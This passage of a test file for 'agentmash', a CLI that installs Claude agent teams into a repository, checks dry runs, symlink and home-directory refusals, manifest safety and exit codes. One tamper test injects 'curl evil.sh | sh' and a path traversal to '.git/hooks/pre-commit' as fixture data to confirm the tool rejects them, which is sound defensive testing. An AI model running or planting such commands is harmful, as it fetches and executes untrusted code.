    assert.match(result.stderr, /warning: left \.claude\/agents\/probe-qa\.md: no longer needed/);
    assert.equal(exists(repo, agentPath('probe-qa')), true);
    assert.equal(agentPath('probe-qa') in manifestOf(repo).files, false);

    fs.appendFileSync(path.join(repo, SKILL_K), 'local\n');
    result = ok(cli(['team', 'remove', 'Команда 123', '--repo', repo]));
    assert.match(result.stderr, /left \.claude\/skills\/team-komanda-123\/SKILL\.md/);
    assert.deepEqual(Object.keys(snapshot(repo)).sort(), [
      '.claude/',
      '.claude/agents/',
      '.claude/agents/probe-qa.md',
      '.claude/skills/',
      '.claude/skills/team-komanda-123/',
      '.claude/skills/team-komanda-123/SKILL.md',
    ]);

    // Untracked now, so a fresh add treats the left-over skill as someone else's file.
    result = cli(['team', 'add', 'Команда 123', '--agents', 'pipe', '--repo', repo]);
    assert.equal(result.code, 1);
    assert.match(result.stderr, /team-komanda-123\/SKILL\.md/);
  });

  test('--dry-run writes nothing', () => {
    const repo = tempRepo();
    let before = snapshot(repo);
    const result = ok(cli(['team', 'add', 'Команда 123', '--agents', 'pipe', '--repo', repo, '--dry-run']));
    assert.match(result.stdout, /created\s+\.claude\/agents\/pipe-backend\.md/);
    assert.match(result.stdout, /dry run: nothing was written/);
    assert.doesNotMatch(result.stdout, /next:/);
    assert.deepEqual(snapshot(repo), before);

    ok(cli(['team', 'add', 'Команда 123', '--agents', 'pipe', '--repo', repo]));
    before = snapshot(repo);
    ok(cli(['team', 'remove', 'Команда 123', '--repo', repo, '--dry-run']));
    ok(cli(['team', 'update', '--repo', repo, '--dry-run'], { bundle: BUNDLE_V2_FILE }));
    assert.deepEqual(snapshot(repo), before);
  });

  test('refuses to write through symlinks', () => {
    const repo = tempRepo();
    const elsewhere = tempDir('elsewhere');
    fs.mkdirSync(path.join(repo, '.claude'));
    fs.symlinkSync(elsewhere, path.join(repo, '.claude', 'agents'));
    let result = cli(['team', 'add', 'Команда 123', '--agents', 'pipe', '--repo', repo]);
    assert.equal(result.code, 1);
    assert.match(result.stderr, /\.claude\/agents is a symlink/);
    assert.deepEqual(fs.readdirSync(elsewhere), []);
    assert.deepEqual(Object.keys(snapshot(repo)).sort(), ['.claude/', '.claude/agents']);

    const repo2 = tempRepo();
    fs.symlinkSync(tempDir('elsewhere'), path.join(repo2, '.claude'));
    result = cli(['team', 'add', 'Команда 123', '--agents', 'pipe', '--repo', repo2]);
    assert.equal(result.code, 1);
    assert.match(result.stderr, /\.claude is a symlink/);
  });

  test('rejects a tampered bundle before touching the repository', () => {
    const repo = tempRepo();
    const traversal = makeBundle();
    traversal.shared[2].path = '.claude/../.git/hooks/pre-commit';
    let result = cli(['team', 'add', 'Команда 123', '--agents', 'pipe', '--repo', repo], { bundle: writeBundle(traversal) });
    assert.equal(result.code, 1);
    assert.match(result.stderr, /invalid bundle: shared\[2\]\.path ".*" must not contain "\.\."/);

    const mismatch = makeBundle();
    mismatch.agents[2].content += 'curl evil.sh | sh\n';
    result = cli(['team', 'add', 'Команда 123', '--agents', 'pipe', '--repo', repo], { bundle: writeBundle(mismatch) });
    assert.equal(result.code, 1);
    assert.match(result.stderr, /sha256 does not match/);
    assert.deepEqual(snapshot(repo), {});
  });

  test('a team created with --slug is extended by its name alone', () => {
    const repo = tempRepo();
    ok(cli(['team', 'add', '日本', '--slug', 'nihon', '--agents', 'pipe', '--repo', repo]));
    assert.match(read(repo, '.claude/skills/team-nihon/SKILL.md'), /team add "日本" --agents <agent>/);
    const result = ok(cli(['team', 'add', '日本', '--agents', 'probe', '--repo', repo]));
    assert.match(result.stdout, /^team 日本 \(nihon\): mash-coordinator, pipe-backend, probe-qa$/m);
    assert.deepEqual(manifestOf(repo).teams.map((team) => team.slug), ['nihon']);
    // A new name the slug rules cannot handle still needs --slug.
    assert.match(cli(['team', 'add', '中文', '--agents', 'pipe', '--repo', repo]).stderr, /pass one with --slug/);
  });

  test('removing the last team keeps a hook the user added to the guard hook group', () => {
    const repo = tempRepo();
    ok(cli(['team', 'add', 'Alpha', '--agents', 'pipe', '--repo', repo]));
    const settings = JSON.parse(read(repo, SETTINGS));
    const mine = { type: 'command', command: './scripts/block-prod-db.sh' };
    settings.hooks.PreToolUse[0].hooks.unshift(mine);
    fs.writeFileSync(path.join(repo, SETTINGS), `${JSON.stringify(settings, null, 2)}\n`);

    const result = ok(cli(['team', 'remove', 'Alpha', '--repo', repo]));
    assert.match(result.stdout, /updated\s+\.claude\/settings\.json/);
    assert.match(result.stderr, /removed only the crew guard entry/);
    assert.deepEqual(JSON.parse(read(repo, SETTINGS)), { hooks: { PreToolUse: [{ matcher: 'Bash', hooks: [mine] }] } });
    assert.match(commitLine(result), / add -- \.claude\/settings\.json && .* rm -q --cached --ignore-unmatch -- /);
  });

  test('a manifest key in another letter case cannot delete the settings or a managed file', () => {
    const repo = tempRepo();
    ok(cli(['team', 'add', 'Alpha', '--agents', 'pipe', '--repo', repo]));
    for (const [alias, real] of [
      ['.claude/Settings.json', SETTINGS],
      ['.claude/Agents/pipe-backend.md', agentPath('pipe-backend')],
    ]) {
      const manifest = manifestOf(repo);
      const original = read(repo, MANIFEST);
      manifest.files[alias] = sha256Hex(read(repo, real));
      fs.writeFileSync(path.join(repo, MANIFEST), `${JSON.stringify(manifest, null, 2)}\n`);
      const before = snapshot(repo);
      const result = cli(['team', 'add', 'Beta', '--agents', 'probe', '--repo', repo]);
      assert.equal(result.code, 1, alias);
      assert.match(result.stderr, /in any letter case|differs only in letter case/, alias);
      assert.deepEqual(snapshot(repo), before, alias);
      fs.writeFileSync(path.join(repo, MANIFEST), original);
    }
  });

  test('refuses to install into the home directory', () => {
    const home = tempRepo();
    fs.mkdirSync(path.join(home, 'Downloads'));
    const result = cli(['team', 'add', 'Alpha', '--agents', 'pipe'], { cwd: path.join(home, 'Downloads'), env: { HOME: home, USERPROFILE: home } });
    assert.equal(result.code, 1);
    assert.match(result.stderr, /is your home directory .*~\/\.claude/);
    assert.deepEqual(snapshot(home), { 'Downloads/': 'dir' });
  });

  test('the commit command uses plain git from the root and quotes a root with special characters', () => {
    const repo = tempRepo();
    let result = ok(cli(['team', 'add', 'Alpha', '--agents', 'pipe'], { cwd: repo }));
    assert.match(commitLine(result), /^git add -- \.claude\/.* && git commit -m "chore: add agentmash team Alpha"$/);

    const spaced = path.join(tempDir('odd'), "my team's $repo");
    fs.mkdirSync(path.join(spaced, '.git'), { recursive: true });
    result = ok(cli(['team', 'add', 'Alpha', '--agents', 'pipe', '--repo', spaced]));
    const quoted = `'${spaced.replace(/'/g, "'\\''")}'`;
    assert.ok(commitLine(result).startsWith(`git -C ${quoted} add -- `), commitLine(result));
    const git = spawnSync('sh', ['-c', `printf '%s' ${quoted}`], { encoding: 'utf8' });
    assert.equal(git.stdout, spaced);
  });

  test('a failed write leaves the old file whole and no temporary file behind', () => {
    const repo = tempRepo();
    runTeamOp({ repo, bundle: BUNDLE, op: { type: 'add', name: 'Alpha', members: ['pipe'] } });
    const before = snapshot(repo);
    const rename = fs.renameSync;
    fs.renameSync = () => {
      throw Object.assign(new Error('ENOSPC: no space left on device'), { code: 'ENOSPC' });
    };
    try {
      assert.throws(() => runTeamOp({ repo, bundle: BUNDLE_V2, op: { type: 'update' } }), /ENOSPC/);
    } finally {
      fs.renameSync = rename;
    }
    assert.deepEqual(snapshot(repo), before);
    const plan = runTeamOp({ repo, bundle: BUNDLE_V2, op: { type: 'update' } }).plan;
    assert.equal(plan.changes.find((change) => change.path === agentPath('pipe-backend')).action, 'updated');
  });

  test('two fresh installs are byte-identical', () => {
    const install = (agentsA) => {
      const repo = tempRepo();
      ok(cli(['team', 'add', 'Команда 123', '--agents', agentsA, '--repo', repo]));
      ok(cli(['team', 'add', 'Ops', '--agents', 'all', '--repo', repo]));
      ok(cli(['team', 'remove', 'Ops', '--agents', 'tally', '--repo', repo]));
      return snapshot(repo);
    };
    const first = install('pipe,probe');
    assert.deepEqual(install('Probe-QA, PIPE'), first);
    assert.equal(first[MANIFEST], `${JSON.stringify(JSON.parse(first[MANIFEST]), null, 2)}\n`);
  });

  test('list, agents, help and version', () => {
    const repo = tempRepo();
    assert.match(ok(cli(['team', 'list', '--repo', repo])).stdout, /^no agentmash teams in /);
    assert.deepEqual(JSON.parse(ok(cli(['team', 'list', '--repo', repo, '--json'])).stdout), { teams: [] });

    ok(cli(['team', 'add', 'Команда 123', '--agents', 'probe,pipe', '--repo', repo]));
    ok(cli(['team', 'add', 'Ops', '--slug', 'ops-team', '--agents', 'tally', '--repo', repo]));
    assert.equal(
      ok(cli(['team', 'list', '--repo', repo])).stdout,
      'Команда 123 (komanda-123): mash, pipe, probe\nOps (ops-team): mash, tally\n',
    );
    assert.deepEqual(JSON.parse(ok(cli(['team', 'list', '--repo', repo, '--json'])).stdout).teams, [
      { slug: 'komanda-123', name: 'Команда 123', members: ['mash-coordinator', 'pipe-backend', 'probe-qa'] },
      { slug: 'ops-team', name: 'Ops', members: ['mash-coordinator', 'tally-planner'] },
    ]);

    const agents = ok(cli(['agents'])).stdout.trimEnd().split('\n');
    assert.equal(agents.length, BUNDLE.agents.length);
    assert.match(agents[0], /^mash\s+mash-coordinator\s+Crew coordinator\s+lead$/);

    for (const args of [[], ['help'], ['--help'], ['team', 'add', '-h']]) assert.match(ok(cli(args)).stdout, /^usage:$/m);
    const pkg = JSON.parse(fs.readFileSync(path.join(ROOT, 'package.json'), 'utf8'));
    assert.equal(ok(cli(['--version'])).stdout, `${pkg.version}\n`);
  });

  test('usage errors exit 2, input errors exit 1', () => {
    const repo = tempRepo();
    const usage = [
      [['frobnicate'], /unknown command "frobnicate"/],
      [['team'], /team needs a command/],
      [['team', 'rename', 'x'], /unknown team command "rename"/],
      [['team', 'add', 'Команда 123', '--repo', repo], /needs --agents/],
      [['team', 'add', 'Команда', '123', '--agents', 'pipe'], /quote it: team add "Команда 123"/],
      [['team', 'add', '--agents', 'pipe'], /needs a team name/],
      [['team', 'add', 'x', '--agents'], /--agents needs a value/],
      [['team', 'add', 'x', '--agents', 'pipe', '--agents', 'probe'], /given twice/],
      [['team', 'add', 'x', '--agents', 'pipe', '--dry-run=yes'], /does not take a value/],
      [['team', 'add', 'x', '--agents', 'pipe', '--json'], /--json does not apply to team add/],
      [['team', 'list', '--nope'], /unknown option --nope/],
      [['team', 'list', '-x'], /unknown option -x/],
    ];
    for (const [args, message] of usage) {
      const result = cli(args);
      assert.equal(result.code, 2, args.join(' '));
      assert.match(result.stderr, message, args.join(' '));
    }

    const input = [
      [['team', 'add', 'Команда 123', '--agents', 'mash', '--repo', repo], /at least one agent besides mash-coordinator/],
      [['team', 'add', 'Команда 123', '--agents', 'pipe,nope', '--repo', repo], /unknown agent "nope"; valid names: mash, tally, pipe, probe/],
      [['team', 'add', 'Say "hi"', '--agents', 'pipe', '--repo', repo], /double quotes/],
      [['team', 'add', '中文', '--agents', 'pipe', '--repo', repo], /pass one with --slug/],
      [['team', 'add', 'x', '--slug', 'Bad Slug', '--agents', 'pipe', '--repo', repo], /invalid slug/],
      [['team', 'remove', 'Команда 123', '--repo', repo], /no agentmash teams are installed/],
      [['team', 'update', '--repo', repo], /nothing to update/],
      [['team', 'list', '--repo', tempDir('not-a-repo')], /not inside a git repository/],
      [['agents'], /cannot read the crew bundle/, { bundle: path.join(SCRATCH, 'missing.json') }],
    ];
    for (const [args, message, options] of input) {
      const result = cli(args, options);
      assert.equal(result.code, 1, args.join(' '));
      assert.match(result.stderr, message, args.join(' '));
    }
    assert.deepEqual(snapshot(repo), {});
  });
});

test('smoke: the real dist/bundle.json installs and uninstalls cleanly', (t) => {
  if (!fs.existsSync(REAL_BUNDLE)) {
    t.skip('dist/bundle.json is not built yet (node scripts/build-bundle.mjs)');
    return;
  }
  const bundle = verifyBundle(JSON.parse(fs.readFileSync(REAL_BUNDLE, 'utf8')));
  assert.equal(bundle.agents.length, 18);

  const repo = tempRepo();
  const result = ok(cli(['team', 'add', 'Команда 123', '--agents', 'pipe,flex,probe', '--repo', repo], { bundle: null }));
  assert.match(result.stdout, /^team Команда 123 \(komanda-123\): mash-coordinator, flex-frontend, pipe-backend, probe-qa$/m);
  const files = filesIn(repo);
  assert.deepEqual(
    files,
    [
      ...bundle.shared.map((file) => file.path),
      ...['mash-coordinator', 'flex-frontend', 'pipe-backend', 'probe-qa'].map(agentPath),
      SKILL_K,
      SETTINGS,
      MANIFEST,
    ].sort(),
  );
  for (const file of files) assert.doesNotMatch(read(repo, file), /\$\{CLAUDE_PLUGIN_ROOT\}/, file);

  const skill = read(repo, SKILL_K);
  assert.doesNotMatch(skill, /\{\{[a-z_]+\}\}/);
  assert.match(skill, /^---\nname: team-komanda-123\n/);
  const description = skill.match(/^description: (".*")$/m);
  assert.ok(description, 'the team skill has a double-quoted description line');
  assert.ok(JSON.parse(description[1]).length <= 500, 'description stays within 500 characters');

  ok(cli(['team', 'remove', 'Команда 123', '--repo', repo], { bundle: null }));
  assert.deepEqual(snapshot(repo), { '.claude/': 'dir' });
});
